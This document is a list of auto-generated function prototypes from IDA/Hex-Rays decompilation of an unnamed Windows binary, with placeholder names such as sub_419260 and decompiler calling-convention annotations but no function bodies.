size_t __cdecl sub_419260(int a1, void *Buffer, size_t ElementCount);
size_t __cdecl sub_4192E0(int a1, void *Buffer, size_t ElementSize);
int __cdecl sub_419310(int a1, int a2, int Offset, FILE *Stream); // idb
unsigned int __cdecl sub_419610(int a1, char *Buffer, int MaxCount);
size_t __cdecl sub_419660(int a1, const char *Buffer);
_DWORD *__cdecl sub_4196B0(LPCCH lpMultiByteStr, char *Str);
int __cdecl sub_4197A0(int a1, int a2);
void *sub_4197E0();
void __cdecl sub_419810(_DWORD *Block);
// void *__usercall sub_419870@<eax>(int a1@<edi>, size_t Size);
unsigned int __cdecl sub_4198C0(int a1, unsigned int a2);
unsigned int __cdecl sub_4199A0(int a1, unsigned int a2);
char *__cdecl sub_419AA0(char *a1, char *a2, unsigned int a3);
_DWORD *__cdecl sub_419B00(int a1);
void **sub_419B40();
void sub_419B50();
// int __usercall sub_419BB0@<eax>(int a1@<edi>);
struct _RTL_CRITICAL_SECTION *sub_419C10();
int __cdecl sub_419C50(int a1, int a2, double a3); // idb
int __cdecl sub_41A010(int a1, int a2);
int __cdecl sub_41A590(int a1, int a2);
int __cdecl sub_41A5B0(int a1, int a2);
BOOL sub_41A5D0();
int sub_41A6D0();
int __cdecl sub_41A6E0(_DWORD *a1);
int __cdecl sub_41A710(_DWORD *a1);
_DWORD *sub_41A740();
int __cdecl sub_41A750(int (__cdecl *a1)(int, void **, int), const char *a2, _DWORD *a3, int a4, int a5, void *a6);
int __cdecl sub_41A7F0(int a1, int *a2);
void *sub_41A820();
int __cdecl sub_41A830(void *a1, signed int Size, int a3, const char *Src);
int __cdecl sub_41A910(char *a1, int a2);
char *__cdecl sub_41A980(char *a1, const char *a2, int a3, int a4);
int __cdecl sub_41AA30(int *a1, char *Src, size_t *a3, int (__cdecl *a4)(char *, int, _DWORD, const char *), const char *a5);
int __cdecl sub_41AC00(char **a1, char *a2);
int __cdecl sub_41ACA0(int a1, const char *a2, const char *a3, int a4, int a5);
int __cdecl sub_41AF10(_DWORD *a1, _DWORD *a2, int a3, int a4, _DWORD *a5);
int __cdecl sub_41B4C0(const char *a1, const char *a2);
// int __usercall sub_41B540@<eax>(const char *a1@<ecx>, char *a2@<edi>);
int __cdecl sub_41BA70(int (__cdecl *a1)(int, char **), const char *a2, int a3, int a4, int *a5, int a6, int a7, int (__cdecl *a8)(char *, int, int, void *), void *a9);
BOOL __cdecl sub_41BE70(char *Str1, char *a2);
int __cdecl sub_41C0B0(_DWORD *a1, int a2, _DWORD *a3, const char *a4, _DWORD *a5, int a6, void *a7);
void *sub_41C290();
void *sub_41C2A0();
// int __usercall sub_41C2B0@<eax>(int a1@<ebx>);
// int __usercall sub_41C430@<eax>(int *a1@<esi>, int a2);
void *sub_41C4C0();
int __cdecl sub_41C4D0(unsigned int **a1, _DWORD **a2);
int __cdecl sub_41C4F0(int a1, unsigned int a2);
// BOOL __usercall sub_41C510@<eax>(_DWORD *a1@<ecx>, int a2@<edi>, int a3);
int __cdecl sub_41C5B0(int a1, unsigned int **a2, int *a3, _DWORD *a4);
int __cdecl sub_41C6B0(int a1, int a2);
int __cdecl sub_41C6E0(int a1, int *a2);
void *sub_41C8C0();
int __cdecl sub_41C8D0(int a1, int *a2, int a3, int a4);
void *sub_41C950();
void *sub_41C960();
int __cdecl sub_41C970(int a1, int a2);
void *sub_41C990();
void *sub_41C9A0();
void *sub_41C9B0();
int __cdecl sub_41C9C0(int a1, int a2);
void *sub_41C9E0();
void *sub_41C9F0();
void *sub_41CA00();
void *sub_41CA10();
void *sub_41CA20();
void *sub_41CA30();
int __cdecl sub_41CA40(int a1, char ****a2);
int __cdecl sub_41CA70(int a1);
int __cdecl sub_41CA90(int a1);
int __cdecl sub_41CAB0(int a1);
int __cdecl sub_41CAD0(_DWORD *a1, _DWORD *a2);
_DWORD *sub_41CB00();
BOOL __cdecl sub_41CB90(int a1);
int __cdecl sub_41CBC0(_DWORD *a1);
int __cdecl sub_41CC00(void *a1);
// void __usercall sub_41CC50(int a1@<esi>);
int __cdecl sub_41CC90(int a1, unsigned int *a2, int a3, int a4);
int __cdecl sub_41CD00(int a1, int a2);
int __fastcall sub_41CD30(char *a1, int a2, void *a3, volatile LONG *MaxCount);
int __cdecl sub_41CE00(int a1, void *a2);
BOOL __cdecl sub_41CE20(int a1, void *a2, int a3);
BOOL __cdecl sub_41CE60(int a1, int a2);
void __cdecl sub_41CEB0(volatile LONG *Block);
int __cdecl sub_41CF00(_DWORD *a1, int a2);
volatile LONG *__cdecl sub_41CFE0(_DWORD *a1, volatile LONG **a2, int (__cdecl *a3)(char *, int, _DWORD, void *), void *Src);
int __cdecl sub_41D260(int a1, volatile LONG **a2);
void *sub_41D2B0();
int sub_41D2C0();
void __cdecl sub_41D2D0(int a1);
void *sub_41D2F0();
int sub_41D300();
void __cdecl sub_41D310(int a1);
int __cdecl sub_41D330(int *a1, void **a2, int a3);
signed int __cdecl sub_41D350(int a1, void **a2);
int __cdecl sub_41D370(int *a1, void **a2, int a3);
signed int __cdecl sub_41D390(int a1, void **a2);
void *sub_41D3B0();
// int __usercall sub_41D3C0@<eax>(int **a1@<edi>, volatile LONG **a2);
int __cdecl sub_41D4E0(int *a1, int a2, int a3, int a4, int a5, int a6);
int __cdecl sub_41D550(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, int a5);
int __cdecl sub_41D590(int a1, int ***a2);
char **sub_41D5F0();
void __cdecl sub_41D610(volatile LONG *Block);
int __cdecl sub_41D710(int a1, int a2, int a3);
int __cdecl sub_41D720(int a1, int a2);
volatile LONG *__cdecl sub_41D770(int *a1);
int __cdecl sub_41D8C0(void ***a1, void **a2, void **a3, void **a4);
int __cdecl sub_41D940(int a1, int a2, int a3);
int __cdecl sub_41D990(int a1);
int __cdecl sub_41D9A0(int a1);
int __cdecl sub_41D9B0(_DWORD *a1);
int sub_41DAF0();
int __cdecl sub_41DB00(int *a1, void **a2, int a3);
void *sub_41DB20();
void __cdecl sub_41DB60(_DWORD **Block);
int __cdecl sub_41DB90(_DWORD **a1, _DWORD *a2, _DWORD *a3);
int __cdecl sub_41DBD0(int a1, volatile LONG **a2);
int __cdecl sub_41DC20(int *a1, void **a2, int a3);
int __cdecl sub_41DC60(int *a1, void **a2, int a3);
signed int __cdecl sub_41DC80(int a1, void **a2);
int __cdecl sub_41DCA0(int a1, int a2, int a3, void *a4, signed int *a5, int a6);
int __cdecl sub_41DD10(int a1, int a2, int a3, _DWORD **Block, int a5, int a6);
int sub_41DE60();
void __cdecl sub_41DE70(volatile LONG *Block);
int __cdecl sub_41DF20(int a1, int *a2);
volatile LONG *__cdecl sub_41E0E0(int a1);
BOOL __cdecl sub_41E120(int a1);
int __cdecl sub_41E150(_DWORD *a1);
int __cdecl sub_41E1B0(int a1);
int __cdecl sub_41E1F0(int *a1);
int __cdecl sub_41E2E0(int **a1);
int __cdecl sub_41E300(int *a1);
int __cdecl sub_41E520(volatile LONG ***a1, int *a2);
// void __cdecl std::swfun(struct std::ios_base *, int); idb
int __cdecl sub_41E580(int a1, int a2);
int __cdecl sub_41E590(int a1, int a2);
int __cdecl sub_41E5A0(int a1, int a2, _DWORD *a3, int *a4);
// int __usercall sub_41E5E0@<eax>(__m64 a1@<mm0>, int a2, _BYTE *a3, int a4, int *a5);
int __cdecl sub_41E650(int a1);
int __cdecl sub_41E690(int a1, char *a2, unsigned int a3);
int __cdecl sub_41E700(int a1);
int __cdecl sub_41E740(int a1, _BYTE *a2, int a3);
int __cdecl sub_41E7C0(int a1, _DWORD *a2);
BOOL __cdecl sub_41E860(int a1);
int __cdecl sub_41E880(int a1);
int __cdecl sub_41E8D0(_DWORD *a1, _DWORD *a2);
int __cdecl sub_41E930(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
void *sub_41E9C0();
void *sub_41E9D0();
void *sub_41E9E0();
void *sub_41E9F0();
void *sub_41EA00();
void *sub_41EA10();
void *sub_41EA20();
void *sub_41EA30();
signed int __cdecl sub_41EA40(int a1, void **a2);
void __cdecl sub_41EA60(int a1);
// int __usercall sub_41EA80@<eax>(int a1@<ecx>, _DWORD *a2@<ebx>);
int __cdecl sub_41ED10(int a1, int *a2);
int __cdecl sub_41F000(_DWORD *a1, int a2);
_DWORD *__cdecl sub_41F1E0(FILE *Stream, _DWORD *a2);
// int *__usercall sub_41F2B0@<eax>(__m64 a1@<mm0>, int a2);
// int *__usercall sub_41F880@<eax>(__m64 a1@<mm0>, int *a2);
// int *__usercall sub_41F960@<eax>(__m64 a1@<mm0>, volatile LONG ***a2, _DWORD *a3, int a4);
// int __usercall sub_41FAC0@<eax>(__m64 a1@<mm0>, int *a2, void **a3, int a4);
int __cdecl sub_41FCA0(int a1, void **a2);
int __cdecl sub_41FE80(FILE *Stream, void **a2);
// int __usercall sub_41FEC0@<eax>(__m64 a1@<mm0>, int *a2, _DWORD *a3, int a4);
// int __usercall sub_41FF90@<eax>(__m64 a1@<mm0>, int *a2, _BYTE **a3, int a4);
int __cdecl sub_420010(int a1, void **a2);
int __cdecl sub_420120(int *a1, void **a2, int a3);
signed int __cdecl sub_420140(int a1, void **a2);
void *sub_420160();
void __cdecl sub_4201A0(_DWORD **Block);
int __cdecl sub_4201D0(int a1);
int __cdecl sub_420250(int a1, volatile LONG **a2);
int __cdecl sub_4202A0(int *a1, void **a2, int a3);
signed int __cdecl sub_4202C0(int a1, void **a2);
void *sub_4202E0();
int __cdecl sub_4202F0(volatile LONG **a1, void **a2, int a3);
signed int __cdecl sub_4203D0(_DWORD *a1, void **a2);
// int __usercall sub_420460@<eax>(int a1@<esi>, int a2);
// int __usercall sub_4204F0@<eax>(_DWORD *a1@<esi>);
// _DWORD *__usercall sub_420550@<eax>(int *a1@<esi>, char a2);
// int __usercall sub_420640@<eax>(int a1@<edx>, int a2@<esi>);
_DWORD *sub_420670();
void __cdecl sub_4206C0(void **Block);
int __cdecl sub_420700(int *a1);
int __cdecl sub_420750(_DWORD *a1);
_DWORD *__cdecl sub_420790(int *a1);
int *__fastcall sub_4207F0(int a1, int *a2);
// void **__usercall sub_4208C0@<eax>(int *a1@<esi>, void **a2, _DWORD *a3, int *a4);
int __cdecl sub_420B60(_DWORD *a1, _DWORD *a2, _DWORD *a3, int *a4);
void **__cdecl sub_420C00(void **a1, _DWORD *a2, int *a3, int *a4, _DWORD *a5);
void **__cdecl sub_4211F0(void **a1, _DWORD *a2, int *a3, int *a4);
int __cdecl sub_421250(_DWORD *a1, unsigned int *a2, int a3, unsigned int *a4, int a5);
unsigned int __cdecl sub_421370(unsigned int *a1, unsigned int *a2, unsigned int *a3, int a4, int a5, int a6, unsigned int *a7);
unsigned int *__cdecl sub_4217C0(unsigned int *a1, unsigned int *a2, unsigned int *a3, int a4, int a5, int a6, unsigned int *a7);
int __cdecl sub_421C20(unsigned int **a1, unsigned int **a2, unsigned int **a3, int *a4);
int __cdecl sub_421EA0(int a1, int a2, int a3);
int __cdecl sub_421F50(_DWORD *a1, int a2, int a3);
int __cdecl sub_422020(_DWORD *a1, int a2, int a3);
int __cdecl sub_4220E0(_DWORD *a1, int a2, int a3);
char *__cdecl sub_422170(_DWORD *a1, int a2, unsigned int *a3);
int __cdecl sub_422350(int a1);
int __cdecl sub_422360(_DWORD *a1);
int __cdecl sub_422380(void *a1, int a2, int a3); // idb
int __cdecl sub_4223C0(_DWORD *a1, int a2, int a3);
int __cdecl sub_4223F0(int a1, void *Src, int a3); // idb
int __cdecl sub_422460(_DWORD *a1, void *Src, size_t Size);
int __cdecl sub_4224B0(_DWORD *a1, void *a2, signed int Size);
BOOL __cdecl sub_422520(int a1, int a2, int a3, int a4);
int __cdecl sub_422580(int *a1, _DWORD *a2, void *a3, signed int Size);
int __cdecl sub_422620(int a1, int a2, char *a3, unsigned int a4);
unsigned int __cdecl sub_4229E0(char *a1, signed int a2, int a3);
int __cdecl sub_422A00(int a1, int a2);
_DWORD *sub_422B30();
void __cdecl sub_422B70(void **Block);
void **__cdecl sub_422C00(void ***a1, _BYTE **a2, int Size);
void **__cdecl sub_422DD0(void ***a1, _DWORD *a2, int a3);
int __cdecl sub_422E70(_DWORD *a1);
int __cdecl sub_422F70(_DWORD *a1, _DWORD *a2);
int __cdecl sub_4230B0(int a1);
int __cdecl sub_4230D0(int a1);
void __cdecl sub_4230E0(void ***Block);
void sub_423120();
void *__cdecl sub_423180(int a1);
char **__cdecl sub_423310(unsigned int a1);
char *__cdecl sub_4233A0(unsigned int a1);
char *__cdecl sub_423440(unsigned int a1);
int __cdecl sub_4234E0(int a1);
int __cdecl sub_423580(int a1, int a2, int a3, int a4, int (__cdecl *a5)(int, int), char a6);
int __cdecl sub_423630(int a1);
int __cdecl sub_423640(int a1);
int __cdecl sub_423650(int a1, int a2, int a3, int a4, int (__cdecl *a5)(int, int));
int __cdecl sub_423680(int a1);
unsigned int __cdecl sub_423740(char *a1, signed int a2, int a3, int a4);
int __cdecl sub_423A80(const char *a1);
int __cdecl sub_423B70(const char *a1);
char **__cdecl sub_423C60(char *a1, int a2);
void *__cdecl sub_423D50(char *a1, const char *a2, const char *a3);
int __cdecl sub_423E20(_DWORD *a1);
_DWORD *__cdecl sub_423E40(_DWORD *a1, int a2, int a3);
int __cdecl sub_423E90(int *a1, int a2, int *a3);
void **__cdecl sub_423F50(int a1, int a2, int *a3);
int __cdecl sub_423FE0(int *a1, int *a2);
int __cdecl sub_424010(int *a1, char *Src, size_t Size);
int __cdecl sub_4240F0(int a1, int a2);
int __cdecl sub_424220(_DWORD *a1);
void __cdecl sub_424260(void **Block);
// void __usercall sub_4242D0(int a1@<ebx>, _DWORD *a2, void (__cdecl *a3)(_DWORD), void (__cdecl *a4)(_DWORD, int), int a5);
void __cdecl sub_424330(_DWORD *a1, void (__cdecl *a2)(_DWORD));
void __cdecl sub_424370(_DWORD *a1, void (__cdecl *a2)(_DWORD, int), int a3);
// int __usercall sub_4243A0@<eax>(int a1@<esi>);
// _DWORD *__usercall sub_424480@<eax>(int a1@<esi>);
// int __usercall sub_424510@<eax>(int a1@<esi>, int a2, unsigned int *a3);
int __cdecl sub_424590(_BYTE *a1);
int __cdecl sub_4245E0(int a1);
_DWORD *__cdecl sub_4245F0(int (__cdecl *a1)(_BYTE *a1), int (__cdecl *a2)(const char *Str1, const char *Str2));
_DWORD *__cdecl sub_424680(_DWORD *a1, int a2);
int __cdecl sub_424710(_DWORD *a1, int a2);
_DWORD *__cdecl sub_424780(int a1, int a2);
void *__cdecl sub_4247B0(const char *Src);
void *__cdecl sub_424800(void *Src, size_t Size);
_BYTE *__cdecl sub_424860(_BYTE *a1, int a2);
int __cdecl sub_424880(char *a1, const char *a2, unsigned int a3);
int __cdecl sub_4248C0(char *a1, const char *a2, unsigned int a3);
int __cdecl sub_424920(char a1);
void *__cdecl sub_424A20(const char *a1, _DWORD *a2);
_BYTE *__cdecl sub_424B40(_BYTE *a1, int a2);
BOOL __cdecl sub_424BE0(int ErrorNumber, char *Buffer, size_t SizeInBytes);
_BYTE *__cdecl sub_424C00(_BYTE *Src, int a2);
int __cdecl sub_424C60(char a1);
void __cdecl sub_424CD0(); // idb
void __cdecl sub_424DF0(_DWORD *Block);
void sub_424E30();
BOOL sub_424E40();
int sub_424E60();
int sub_424E70();
void sub_424E80();
int sub_424E90();
int sub_424EB0(); // weak
int sub_424ED0();
int sub_424EF0(); // weak
int sub_424F00(); // weak
int sub_424F10(); // weak
int sub_424F20(); // weak
int sub_424F30(); // weak
int sub_424F40();
int sub_424F50(); // weak
BOOL __cdecl sub_424FA0(int a1, int a2, _DWORD *a3);
int __cdecl sub_425300(int *a1, int a2);
int __cdecl sub_425460(unsigned __int32 *a1, int a2, char *a3, int a4);
int *__cdecl sub_425600(int a1, int a2);
__m64 *__cdecl sub_425740(__m64 *a1, __int64 a2, __int64 a3);
const __m128i *__cdecl sub_426050(__m128i *a1, const __m128i *a2);
__int64 __cdecl sub_426170(__int64 a1);
__int64 __cdecl sub_426240(__int64 a1, const __m128i *a2, int a3);
int __cdecl sub_426840(int a1, int a2);
_DWORD *__cdecl sub_426860(int a1);
int __cdecl sub_4268C0(int *a1, int a2, int a3);
int __cdecl sub_426960(int *a1, int a2);
int __cdecl sub_4269B0(int *a1, int a2);
int __cdecl sub_4269D0(int *a1);
void __cdecl sub_4269F0(void **Block);
int __cdecl sub_426A30(int a1);
int __cdecl sub_426A40(int *a1, int a2);
int __cdecl sub_426A60(int *a1, int a2, int a3);
void __cdecl sub_426A90(int a1);
int __cdecl sub_426AD0(int a1);
_DWORD *sub_426AF0();
int __cdecl sub_426B00(int *a1, int a2);
// int __usercall sub_426B60@<eax>(int a1@<esi>, int a2, char a3);
int __cdecl sub_426BE0(int a1, int a2);
void __cdecl sub_426C00(void *Block, void (__cdecl *a2)(_DWORD));
BOOL __cdecl sub_426C60(SOCKET s);
int __cdecl sub_426C80(_DWORD *a1);
int __cdecl sub_426CA0(_DWORD *a1);
int __cdecl sub_426CE0(_DWORD *a1, int a2, int a3, int *a4);
int __cdecl sub_426DE0(int a1, char *buf, int len); // idb
int __cdecl sub_426E50(int a1, char *buf, int len); // idb
int __cdecl sub_426EC0(int a1, char *buf); // idb
int __cdecl sub_426EF0(int *a1, _DWORD *a2, _DWORD *a3, int *a4, int *a5);
// int __usercall sub_4272A0@<eax>(int a1@<edx>, char a2@<cl>, _DWORD *a3@<edi>, int a4, int a5);
int __fastcall sub_4272F0(int a1, int a2, _DWORD *a3, int a4, int a5);
// int __usercall sub_427520@<eax>(__m64 a1@<mm0>, unsigned int *a2, _DWORD *a3, _DWORD *a4, int a5, int *a6, void *a7);
// int __usercall sub_427A30@<eax>(__m64 a1@<mm0>, unsigned int *a2, unsigned int a3, _DWORD *a4, int a5, int *a6, _DWORD *a7);
// int __usercall sub_427DE0@<eax>(__m64 a1@<mm0>, unsigned int *a2, int *a3, _DWORD *a4, int a5, int *a6, void *a7);
// int __usercall sub_4282A0@<eax>(__m64 a1@<mm0>, int *a2, int *a3, _DWORD *a4, int *a5, int *a6);
int __cdecl sub_428330(unsigned int *a1, unsigned int **a2);
int __cdecl sub_428540(unsigned int *a1, _DWORD *a2, int a3, int *a4);
void __cdecl sub_4285A0(_DWORD *Block);
int __cdecl sub_4285F0(_DWORD *a1, int **a2, int *a3);
_DWORD *__cdecl sub_428820(_DWORD *a1, _DWORD *a2);
// int __usercall sub_428890@<eax>(__m64 a1@<mm0>, unsigned int *a2, int *a3, int a4, int a5, int *a6);
_DWORD *sub_4289A0();
_DWORD *__cdecl sub_428A00(_DWORD **a1, LPCRITICAL_SECTION lpCriticalSection, int **a3, int *a4);
int __cdecl sub_428A90(void *a1, int a2, void *Src, int Size);
int __cdecl sub_428AF0(char *a1, int a2, void *Src, int Size);
int __cdecl sub_428B50(_BYTE *a1, int a2, void *Src, int Size);
int __cdecl sub_428C00(void *a1, int a2, _BYTE *a3, int a4, int a5);
int __cdecl sub_428D10(int a1, int a2, int a3, int a4, int a5);
int __cdecl sub_428E80(_BYTE *a1, int a2, const void *a3, int Size, int a5, int a6, char *a7, int a8);
int __cdecl sub_429070(void *a1, int a2, const void *a3, int a4, int Size, int a6, int a7, char *a8, int a9);
int __cdecl sub_4293B0(_BYTE *a1, int a2, const void *a3, int Size, int a5, int a6);
int __cdecl sub_4293E0(void *a1, int a2, const void *a3, int a4, int Size, int a6, int a7);
int __cdecl sub_429410(_BYTE *a1, int a2, void *Src, int Size);
int __cdecl sub_429480(void *a1, int a2, char *a3, int a4, int a5);
int __cdecl sub_4295A0(_BYTE *a1, int a2, void *Src, int Size);
size_t __cdecl sub_429650(void *a1, int a2, void *Src, int Size, int a5);
int __cdecl sub_4297F0(_BYTE *a1, int a2, void *Src, size_t Size);
size_t __cdecl sub_429870(void *a1, int a2, char *a3, int a4, int a5);
int __cdecl sub_429960(int a1);
int __cdecl sub_4299A0(_DWORD *a1, int a2, _DWORD *a3, int *a4, int *a5);
_DWORD *__cdecl sub_429EA0(_DWORD *a1);
int __cdecl sub_429EE0(volatile LONG *Block, int a2);
int __cdecl sub_429F60(volatile LONG *Block);
int __cdecl sub_429FD0(int a1);
int __cdecl sub_42A020(int a1);
void __cdecl sub_42A070(void (**Block)(void));
void sub_42A090();
int __cdecl sub_42A0D0(int a1, int a2, int a3);
int __cdecl sub_42A0E0(int a1, int a2);
int __cdecl sub_42A0F0(_DWORD *a1, int a2);
int __cdecl sub_42A130(int a1, int a2);
int __cdecl sub_42A170(int a1, int a2);
int __cdecl sub_42A190(int a1, int a2);
int __cdecl sub_42A1B0(int a1, int a2);
int __cdecl sub_42A1D0(int a1, int a2);
int __cdecl sub_42A1F0(int a1, int a2);
void *sub_42A210();
struct _RTL_CRITICAL_SECTION *sub_42A220();
void *sub_42A240();
int __cdecl sub_42A2D0(_DWORD *a1, _DWORD *a2, int *a3, int *a4);
int __cdecl sub_42A320(_DWORD *a1, int a2, int a3, int *a4, int *a5);
int __cdecl sub_42A360(_DWORD *a1, int a2, int a3, int *a4);
int __cdecl sub_42A3B0(_DWORD *a1, int a2, int a3, int *a4, int *a5);
int __cdecl sub_42A3F0(_DWORD *a1, int a2, int a3, int a4);
int __cdecl sub_42A430(_DWORD *a1, int *a2, unsigned int **a3, int *a4, int *a5);
int __cdecl sub_42A4B0(int *a1, int *a2, int *a3, int *a4);
int __cdecl sub_42A4F0(int **a1, int **a2, _DWORD *a3);
int __cdecl sub_42A540(int **a1, int **a2, int a3, _DWORD *a4);
int __cdecl sub_42A610(int a1, _DWORD *a2, int a3, int a4);
int __cdecl sub_42A7D0(_DWORD *a1, int a2, int a3, int a4);
int __cdecl sub_42A7F0(_DWORD *a1, int a2, int a3, int a4);
// int __usercall sub_42A810@<eax>(_DWORD *a1@<edi>, _DWORD *a2@<esi>, int a3);
int __cdecl sub_42A970(_DWORD *a1, _DWORD *a2);
int __cdecl sub_42A990(_DWORD *a1, _DWORD *a2);
int __cdecl sub_42A9B0(_DWORD *a1, int *a2, int a3, void *a4, size_t Size, int *a6);
int __cdecl sub_42ABD0(size_t Size); // idb
void *__cdecl sub_42ABE0(size_t Size);
int __cdecl sub_42AC10(void *Block); // idb
int __cdecl sub_42AC20(_DWORD *a1, _DWORD *a2);
int __cdecl sub_42AC30(int *a1, int a2, _DWORD *a3, int *a4, int a5, int a6);
void __cdecl sub_42ADC0(void ***Block);
int __cdecl sub_42AE00(LPCRITICAL_SECTION lpCriticalSection); // idb
_DWORD *__cdecl sub_42AE50(int *a1, int a2);
int sub_42AF60(); // weak
void __cdecl sub_42AF80(_DWORD *a1, int a2, int a3);
int __thiscall sub_42AFC0(volatile LONG *Block);
void *sub_42B060();
int __cdecl sub_42B0D0(volatile LONG *Block);
int __cdecl sub_42B130(volatile LONG *Block);
int __cdecl sub_42B1B0(_DWORD *a1);
char *__cdecl sub_42B220(char *a1);
volatile LONG *sub_42B430();
// int __usercall sub_42B460@<eax>(int a1@<edi>);
int __cdecl sub_42B560(_DWORD *a1);
FILE *__cdecl sub_42B600(LPCCH lpMultiByteStr, const CHAR *a2);
int __cdecl sub_42B790(_BYTE *a1);
void *sub_42B820();
void __cdecl sub_42B840(_BYTE *Block);
int __cdecl sub_42B860(int a1, int *a2, volatile LONG *a3);
int __cdecl sub_42BA10(int a1);
int __cdecl sub_42BA20(_BYTE **a1, int a2, _DWORD *a3);
int __cdecl sub_42BAA0(int a1, int a2);
void *__cdecl sub_42BC10(int a1, int a2, int a3, _DWORD *a4, int *a5, volatile LONG *a6);
int __cdecl sub_42BCA0(_BYTE **a1, int a2, _DWORD *a3);
int __cdecl sub_42BCD0(void *a1); // idb
int __cdecl sub_42BCF0(int a1, const __m128i *Src, size_t Size);
int __cdecl sub_42BD20(int a1, _BYTE *a2);
int __cdecl sub_42BD40(int a1, int a2, int a3, const __m128i *Src);
const char *sub_42BEA0();
int __cdecl sub_42BEB0(void *a1); // idb
int __cdecl sub_42BED0(void *a1); // idb
int __cdecl sub_42BEF0(int a1, char *Src, size_t Size);
int __cdecl sub_42BF20(int a1, _BYTE *a2);
void *sub_42BF40();
void *sub_42BF50();
int __cdecl sub_42BF60(int a1);
int __cdecl sub_42BF80(int a1);
int __cdecl sub_42BFA0(int a1, char *Src, size_t Size);
int __cdecl sub_42BFD0(int a1, _BYTE *a2);
void *sub_42BFF0();
void *sub_42C000();
LPVOID sub_42C010();
// void __usercall sub_42C0A0(int **a1@<ebx>);
int sub_42C0F0();
BOOL sub_42C130();
void ***sub_42C150();
_DWORD *sub_42C1A0();
_DWORD *sub_42C1D0();
void **sub_42C210();
int sub_42C290();
void *sub_42C3E0();
int __cdecl sub_42C3F0(int *a1, void **a2, int a3);
signed int __cdecl sub_42C410(int a1, void **a2);
_DWORD *sub_42C430();
void *sub_42C440();
int __cdecl sub_42C450(int *a1, void **a2, int a3);
signed int __cdecl sub_42C470(int a1, void **a2);
_DWORD *sub_42C490();
void *sub_42C4A0();
int __cdecl sub_42C4B0(int *a1, void **a2, int a3);
void *sub_42C4D0();
_DWORD *sub_42C4E0();
int __cdecl sub_42C4F0(void *Block); // idb
void *sub_42C500();
void *sub_42C510();
_DWORD *sub_42C520();
_DWORD *sub_42C530();
void *sub_42C540();
_DWORD *sub_42C550();
_DWORD *sub_42C560();
void *sub_42C570();
int sub_42C580();
void *sub_42C590();
void *sub_42C5A0();
void *sub_42C5B0();
int __cdecl sub_42C5C0(int *a1, void **a2, int a3);
signed int __cdecl sub_42C5E0(int a1, void **a2);
int sub_42C600();
void __cdecl sub_42C610(int a1);
void *sub_42C630();
void *sub_42C640();
void *sub_42C650();
void *sub_42C660();
void *sub_42C670();
void *sub_42C680();
signed int __cdecl sub_42C690(int a1, void **a2);
signed int __cdecl sub_42C6B0(int a1, void **a2);
void *sub_42C6D0();
int __cdecl sub_42C6E0(int *a1, void **a2, int a3);
signed int __cdecl sub_42C700(int a1, void **a2);
int sub_42C720();
void __cdecl sub_42C730(int a1);
int __cdecl sub_42C750(int a1, int a2, int a3, int a4);
_DWORD *__cdecl sub_42C7D0(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
int __cdecl sub_42C810(int a1, int a2);
void *sub_42C850();
int sub_42C860();
void __cdecl sub_42C870(int a1);
void *__cdecl sub_42C890(void *a1);
char ***__cdecl sub_42C8B0(unsigned int a1, int a2, int a3);
void *sub_42C930();
int sub_42C940();
void __cdecl sub_42C950(int a1);
void *__cdecl sub_42C970(void *a1);
void *sub_42C990();
void *sub_42C9A0();
signed int __cdecl sub_42C9B0(int a1, void **a2);
int sub_42C9D0();
void __cdecl sub_42C9E0(int a1);
void *__cdecl sub_42CA00(void *a1);
int __cdecl sub_42CA20(void ****a1);
void __cdecl sub_42CAA0(int *a1);
int __cdecl sub_42CAF0(void *Block); // idb
void __cdecl sub_42CB00(void *Block);
// int __usercall sub_42CB20@<eax>(int a1@<esi>);
int __cdecl sub_42CC60(int a1, int **a2, int a3, int a4, int a5);
BOOL __cdecl sub_42CC90(int *a1);
// int __usercall sub_42CDB0@<eax>(int *a1@<edi>, void **a2);
int __cdecl sub_42CE10(int a1, int *a2);
// int __usercall sub_42CF20@<eax>(int a1@<esi>);
int __cdecl sub_42D0C0(int *a1, const void **a2, int a3, int a4, int a5, int a6, int a7, _BYTE *a8);
int __cdecl sub_42D2A0(int *a1, void **a2);
int __cdecl sub_42D2F0(unsigned int a1);
// int __usercall sub_42D310@<eax>(int *a1@<edx>, int a2@<ecx>, size_t a3@<ebx>, void *Src, int a5, _BYTE *a6);
int __cdecl sub_42D5A0(int a1);
int __cdecl sub_42D5D0(unsigned int *a1, _DWORD *a2, _BYTE *a3, _BYTE *a4, _BYTE *a5, int *a6, int a7, int a8, int a9, char a10, int a11);
// int __usercall sub_42D790@<eax>(int a1@<edx>, char a2@<cl>, int a3@<ebx>, int **a4, _BYTE **a5, _DWORD *a6);
int __cdecl sub_42D8E0(_BYTE **a1, char a2);
int __cdecl sub_42DA20(int *a1, void **a2, int a3, char a4, int a5, int a6, int a7);
int __cdecl sub_42DC90(int *a1, void **a2, int a3, int a4, int a5, char a6, _BYTE *a7);
// int __usercall sub_42DFE0@<eax>(int a1@<ecx>, int *a2@<edi>, int a3@<esi>, void **a4, int a5, int a6, int a7, _BYTE *a8);
int __cdecl sub_42E690(int **a1, _BYTE **a2, int a3, _DWORD *a4, int a5, int a6);
int __cdecl sub_42E970(int *a1, void **a2, int a3, int a4, int a5, int a6, int a7, _BYTE *a8);
int __cdecl sub_42E9C0(int *a1, void **a2, int a3, int a4);
int __cdecl sub_42EA30(int *a1, _BYTE **a2, int *a3, int a4, int a5);
int __cdecl CompareFunction(unsigned __int8 **a1, unsigned __int8 **a2);
int __fastcall sub_42EDE0(int *a1, int a2, int *a3, void *a4);
// int __usercall sub_42EF40@<eax>(int a1@<ebx>, int *a2, void **a3, int a4, char a5);
int __cdecl sub_42F030(int *a1, void **a2, int a3, int a4, int a5);
int __cdecl sub_42F360(int *a1, void **a2, size_t Size, int a4, int a5, int a6);
// signed int __usercall sub_42F580@<eax>(int a1@<ebx>, int a2, void **a3, int a4);
signed int __cdecl sub_42F620(int a1, void **a2, int a3);
// int __usercall sub_42F640@<eax>(int a1@<edi>, char ***a2@<esi>, int a3);
int __fastcall sub_42F780(int a1, int *a2, int a3);
// char *__usercall sub_42F9B0@<eax>(_DWORD *a1@<esi>, char *a2);
int __cdecl sub_42FA40(int *a1, int a2);
int __cdecl sub_42FA60(int *a1, int *a2);
int __cdecl sub_42FB20(int a1);
void __cdecl sub_42FB60(int **a1, int a2);
// void __usercall sub_42FC40(int a1@<edi>, int *a2@<esi>, int a3);
void __cdecl sub_42FE30(int *a1, int *a2);
void __cdecl sub_42FEF0(int a1, int a2);
